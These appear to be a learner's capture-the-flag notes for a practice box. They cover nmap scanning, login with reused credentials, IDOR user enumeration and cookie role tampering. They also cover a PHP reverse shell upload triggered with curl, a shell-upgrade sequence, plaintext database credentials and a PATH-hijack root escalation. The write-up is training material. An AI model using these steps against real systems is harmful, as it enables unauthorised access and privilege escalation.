- nmap scan:
	- 22: ssh
		- no vulns
		- OpenSSH 7.6p1
	- 80: http
		- Apache httpd 2.4.29

- website
	- simple no on-eye input fields
	-  gobuster
		-  returns nothing
	-  burp suite
		-  login page discoved
		-  try to log in with creds from previous box
			-  `admin:MEGACORP_4dm1n!!`
			-  `id=1`
			-  get's us to administration page
		-  another possible id/username under IDOR
			-  `id=4: john`
			-  `id=13 peter`
			-  `id=23 rafol`
			-  `id=30 superadmin`
				-  `Cookie: user=86575; role=super admin`

- foothold
	- upload php reverse shell from superadmin
	- find where the files got uploaded
		- fuzz with [[dirsearch]] → in /uploads
	- `curl http://<IP>/uploads/<file_name>`
		- → get shell
		- upgrade:	
		```
		SHELL=/bin/bash script -q /dev/null
		ctrl+z
		stty raw -echo
		fg
		reset
		xterm
		```
	- find user flag

- privilege escalation (part1- www-data → robert)
	- `sudo -l` → nothing
	- find creds for the user running the webapp
		- search file structure in `/var/ww/...`
		- `db.php` file in `/var/www/html/cdn-cgi/login`
		- default creds: `robert:M3g4C0rpUs3r!`

- privilege escalation (part2 robert → root)
		- `su robert`
		- `id` - got more info about robert
			- find all files that belong to group that robert is in `find / -type f -group bugtracker` → /usr/bin/bugtracker binary
			- it runs cat on some file
		- → create bogus cat in PATH  
		```
		export PATH=/tmp:$PATH
		cd /tmp/
		echo 'bin/sh' > cat
		chmod +x cat
		```
		- run the binary again → you get shell
			- find the flag